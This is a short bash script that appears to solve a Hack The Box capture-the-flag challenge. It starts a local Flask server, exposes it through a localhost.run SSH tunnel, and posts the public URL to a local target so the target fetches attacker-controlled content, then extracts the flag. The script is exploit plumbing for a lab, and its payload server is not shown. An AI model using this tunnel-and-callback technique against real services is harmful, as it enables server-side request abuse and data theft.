#!/bin/bash

TMP_LOG=/tmp/tmp_proxy.log
TARGET='http://localhost:1337/'

# kill all background jobs
trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT

echo start the python server
python3 flask_server.py &
echo exposing it on remote host
ssh -R 80:localhost:8000 localhost.run -- --no-inject-http-proxy-headers >$TMP_LOG 2>&1 &
sleep 2
pub_url=$(grep 'https://.*life' -o $TMP_LOG)
echo using $pub_url
# encode url
# pub_url=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote('$pub_url'));")
echo sending request and retrievin
curl -i -s -k -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode "url=$pub_url" "$TARGET" | grep 'HTB{.*}' -o

rm /tmp/tmp_proxy.log
